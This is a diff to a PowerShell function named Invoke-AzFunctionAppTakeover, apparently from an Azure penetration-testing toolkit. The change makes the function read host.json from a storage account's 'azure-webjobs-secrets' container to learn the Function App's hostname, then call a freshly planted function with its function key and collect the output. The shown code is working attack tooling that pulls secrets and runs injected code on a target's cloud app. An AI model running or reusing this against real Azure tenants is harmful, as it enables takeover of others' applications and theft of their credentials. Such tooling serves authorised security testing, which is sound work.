@@ -150,25 +150,34 @@ function Invoke-AzFunctionAppTakeover{
 
     if($selectedStorageAccounts.count -eq 0){Write-Verbose 'No Storage Accounts selected'}
     else{
-
-        
+            
         Write-Verbose "`tDumping Function App information for selected Storage Accounts"
 
         # Take list of selected SAs and go through the takeover process
         $selectedStorageAccounts | ForEach-Object{
         
+            # Set Storage Context
+            $currentStorage = ($storageAccounts | where StorageAccountName -EQ $_.StorageAccount)
+            $storageContext = (Get-AzStorageAccount -ResourceGroupName $currentStorage.ResourceGroupName -Name $currentStorage.StorageAccountName).Context
+
+            # Get the host.json file
+            $secretsFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match "host.json" | where Name -Match $_.FunctionApp
+            $TempFile = New-TemporaryFile
+            Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $secretsFile.Name -Context $storageContext -Destination $TempFile -Verbose:$false -Force | Out-Null
+            $hostJSON = (gc $TempFile | ConvertFrom-Json)
+
             # DNS Check if Function App still exists            
             try{
-                Resolve-DnsName (-join($_.FunctionApp,".azurewebsites.net")) -ErrorAction Stop -Verbose:$false -DnsOnly |Out-Null
+                Resolve-DnsName $($hostJSON.hostName) -ErrorAction Stop -Verbose:$false -DnsOnly |Out-Null
                 $appStatus = $true
             }
             catch{
                 $appStatus = $false
-                Write-Verbose "`t`tThe $($_.FunctionApp) Function App found in the $($_.StorageAccount) Storage Account does not exist"
+                Write-Verbose "`t`tThe $($hostJSON.hostName) Function App found in the $($currentStorage.StorageAccountName) Storage Account does not exist"
             }
 
             # Check for auth requirement
-            if((Invoke-WebRequest -Verbose:$false -UseBasicParsing -Uri (-join("https://",$_.FunctionApp,".azurewebsites.net"))).BaseResponse.ResponseUri.Host -ne (-join($_.FunctionApp,".azurewebsites.net"))){
+            if((Invoke-WebRequest -Verbose:$false -UseBasicParsing -Uri (-join("https://",$($hostJSON.hostName)))).BaseResponse.ResponseUri.Host -ne $($hostJSON.hostName)){
                 $appStatus = $false
                 Write-Verbose "`t`tThe $($_.FunctionApp) Function App found in the $($_.StorageAccount) Storage Account requires authentication. Please try this attack manually."
             }
@@ -178,9 +187,6 @@ function Invoke-AzFunctionAppTakeover{
                 $currentStorage = ($storageAccounts | where StorageAccountName -EQ $_.StorageAccount)
                 $currentApp = $_.FunctionApp
 
-                # Set Storage Context
-                $storageContext = (Get-AzStorageAccount -ResourceGroupName $currentStorage.ResourceGroupName -Name $currentStorage.StorageAccountName).Context
-            
                 # Hack-ish filter to get the desired Function App - Share name conventions should be FunctionAppNameAB12, where AB12 is 4 random numbers/letters
                 $fileShareList = Get-AZStorageShare -Context $storageContext | where Name -Match $_.FunctionApp
 
@@ -339,8 +345,9 @@ function Invoke-AzFunctionAppTakeover{
 
                         # Make request to the new function and return the results
                         while ($httpResponseContent -eq $null){
-                            try{
-                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
+                            try{                            
+                                write-verbose "`t`t`t`t`t`tTrying URL - https://$($hostJSON.hostName)/api/$($newFolder)?name=$currentApp&code=$functionCode"
+                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$($hostJSON.hostName)/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)                                
                                 if ($httpFullResponse.StatusCode -eq 200){
                                     $httpResponseContent = $httpFullResponse.Content | ConvertFrom-Json
                                 }
@@ -453,7 +460,9 @@ function Invoke-AzFunctionAppTakeover{
                         # Make request to the new function and return the results
                         while ($httpResponseContent -eq $null){
                             try{
-                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
+                                write-verbose "`t`t`t`t`t`tTrying URL - https://$($hostJSON.hostName)/api/$($newFolder)?name=$currentApp&code=$functionCode"
+                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$($hostJSON.hostName)/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
+
                                 if ($httpFullResponse.StatusCode -eq 200){
                                     $httpResponseContent = $httpFullResponse.Content | ConvertFrom-Json
                                 }
@@ -563,7 +572,9 @@ function Invoke-AzFunctionAppTakeover{
                         # Make request to the new function and return the results
                         while ($httpResponseContent -eq $null){
                             try{
-                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
+                                write-verbose "`t`t`t`t`t`tTrying URL - https://$($hostJSON.hostName)/api/$($newFolder)?name=$currentApp&code=$functionCode"
+                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$($hostJSON.hostName)/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)                                
+
                                 if ($httpFullResponse.StatusCode -eq 200){
                                     $httpResponseContent = $httpFullResponse.Content | ConvertFrom-Json
                                 }
@@ -665,7 +676,9 @@ function Invoke-AzFunctionAppTakeover{
                         # Make request to the new function and return the results
                         while ($httpResponseContent -eq $null){
                             try{
-                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
+                                write-verbose "`t`t`t`t`t`tTrying URL - https://$($hostJSON.hostName)/api/$($newFolder)?name=$currentApp&code=$functionCode"
+                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$($hostJSON.hostName)/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)                                
+
                                 if ($httpFullResponse.StatusCode -eq 200){
                                     $httpResponseContent = $httpFullResponse.Content | ConvertFrom-Json
                                 }
